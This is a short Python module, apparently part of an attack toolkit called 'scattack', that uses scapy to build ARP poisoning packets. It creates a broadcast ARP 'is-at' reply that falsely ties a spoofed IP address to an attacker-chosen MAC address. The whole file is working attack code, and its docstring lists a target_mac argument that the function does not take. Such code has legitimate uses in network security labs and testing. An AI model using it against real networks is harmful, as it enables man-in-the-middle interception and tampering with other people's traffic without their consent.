"""This module is responsible for ARP poisoning."""

from scapy.layers.l2 import ARP, Ether, Packet, Net

from scattack.core.utils import ETHER_ANY, ETHER_BROADCAST


def create_arppoison_packet(
    target_ip: str, spoofed_ip: str, spoofed_mac: str | None = None
) -> Packet:
    """Create ARP packet.

    Args:
        target_mac (str): MAC address of the target
        target_ip (str): IP address of the target
        spoofed_ip (str): IP address of the spoofed IP address
    Returns:
        Ether: ARP packet"""
    return Ether(dst=ETHER_BROADCAST, src=spoofed_mac) / ARP(
        op="is-at",
        psrc=spoofed_ip,
        pdst=target_ip,
        hwdst=ETHER_ANY,
        hwsrc=spoofed_mac,
    )
